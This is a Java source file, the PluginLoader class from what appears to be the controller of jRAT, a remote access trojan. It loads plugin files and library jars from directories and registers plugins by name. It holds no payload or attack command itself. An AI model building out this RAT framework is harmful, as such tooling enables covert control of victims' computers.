package se.jrat.controller.addons;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import jrat.api.RATPlugin;
import pluginlib.Plugin;
import se.jrat.controller.Globals;
import se.jrat.controller.Main;
import se.jrat.controller.utils.ClassUtils;


public class PluginLoader {

	private static List<Plugin<RATPlugin>> plugins = new ArrayList<Plugin<RATPlugin>>();

	public static void loadPlugins() throws Exception {
		File dir = Globals.getPluginDirectory();
		dir.mkdirs();
		
		File files[] = dir.listFiles();
		
		if (files != null) {
			for (File file : files) {
				load(file);
			}
		}
	}
	
	public static List<RATPlugin> getPlugins() {
		List<RATPlugin> list = new ArrayList<RATPlugin>();
		
		for (Plugin<RATPlugin> plugin : plugins) {
			list.add(plugin.getInstance());
		}
		
		return list;
	}
	
	public static void load(File file) throws Exception {
		Main.debug("Loading plugin " + file.getName());
		
		Plugin<RATPlugin> plugin = new Plugin<RATPlugin>(file);
		
		plugin.load();
		
		plugins.add(plugin);
	}

	public static void loadLibs() throws Exception {
		File dir = Globals.getLibDirectory();
		
		for (File file : dir.listFiles()) {
			Main.debug("Loading library: " + file.getName());
			ClassUtils.addToClassPath(file);
		}
	}

	public static void register(Plugin<RATPlugin> plugin) {
		plugins.remove(plugin);
		plugins.add(plugin);
	}

	public static RATPlugin getPlugin(String name) {
		for (Plugin<RATPlugin> plugin : plugins) {
			if (plugin.getInstance().getName().equalsIgnoreCase(name)) {
				return plugin.getInstance();
			}
		}

		return null;
	}

}
